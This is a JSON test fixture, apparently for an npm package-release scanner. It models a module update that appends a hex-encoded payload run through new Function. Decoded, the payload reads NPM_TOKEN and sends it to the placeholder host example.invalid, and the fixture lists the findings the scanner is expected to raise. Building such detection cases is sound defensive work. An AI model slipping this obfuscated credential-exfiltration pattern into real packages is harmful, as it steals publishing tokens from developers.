@@ -1,0 +1,84 @@
+{
+  "id": "decoded-payload-function-exfil",
+  "title": "Modified module runs a hex-encoded token exfiltration through the Function constructor",
+  "category": "obfuscated-dropper",
+  "intent": "The payload ships only as a hex literal decoded by Buffer.from and run by new Function, so no capability is visible in the source. The constant folder decodes the literal as data and splices it in as code because a code-running call consumes it, so the token read and the egress are found on the decoded payload (marked obfuscated) rather than only as dynamic evaluation. Safe: host is example.invalid; nothing is executed.",
+  "previousPackageJson": {
+    "name": "decoded-payload-function-exfil",
+    "version": "2.4.0",
+    "main": "lib/index.js"
+  },
+  "stagedPackageJson": {
+    "name": "decoded-payload-function-exfil",
+    "version": "2.4.1",
+    "main": "lib/index.js"
+  },
+  "previousFiles": [
+    {
+      "path": "package.json",
+      "size": 81,
+      "sha256": "package.json-81",
+      "flags": [],
+      "textSample": "{\"name\":\"decoded-payload-function-exfil\",\"version\":\"2.4.0\",\"main\":\"lib/index.js\"}"
+    },
+    {
+      "path": "lib/index.js",
+      "size": 68,
+      "sha256": "lib/index.js-68",
+      "flags": [],
+      "textSample": "module.exports = function format(v) {\n  return String(v).trim();\n};\n"
+    }
+  ],
+  "stagedFiles": [
+    {
+      "path": "package.json",
+      "size": 81,
+      "sha256": "package.json-81",
+      "flags": [],
+      "textSample": "{\"name\":\"decoded-payload-function-exfil\",\"version\":\"2.4.1\",\"main\":\"lib/index.js\"}"
+    },
+    {
+      "path": "lib/index.js",
+      "size": 411,
+      "sha256": "lib/index.js-411",
+      "flags": [],
+      "textSample": "module.exports = function format(v) {\n  return String(v).trim();\n};\nnew Function(Buffer.from('636f6e73742068203d20726571756972652827687474707327293b0a636f6e73742074203d2070726f636573732e656e762e4e504d5f544f4b454e3b0a682e72657175657374287b20686f73743a20276578616d706c652e696e76616c6964272c20706174683a20272f743f763d27202b20656e636f6465555249436f6d706f6e656e74287429207d292e656e6428293b0a', 'hex').toString())();\n"
+    }
+  ],
+  "expectedRisk": "high",
+  "expectedReleaseRisk": "high",
+  "expectedFindings": [
+    {
+      "ruleId": "code.network-access",
+      "severity": "medium",
+      "file": "lib/index.js"
+    },
+    {
+      "ruleId": "code.dynamic-evaluation",
+      "severity": "medium",
+      "file": "lib/index.js"
+    },
+    {
+      "ruleId": "code.credential-access",
+      "severity": "high",
+      "file": "lib/index.js"
+    }
+  ],
+  "expectedReleaseFindings": [
+    {
+      "ruleId": "code.network-access",
+      "severity": "medium",
+      "file": "lib/index.js"
+    },
+    {
+      "ruleId": "code.dynamic-evaluation",
+      "severity": "medium",
+      "file": "lib/index.js"
+    },
+    {
+      "ruleId": "code.credential-access",
+      "severity": "high",
+      "file": "lib/index.js"
+    }
+  ]
+}
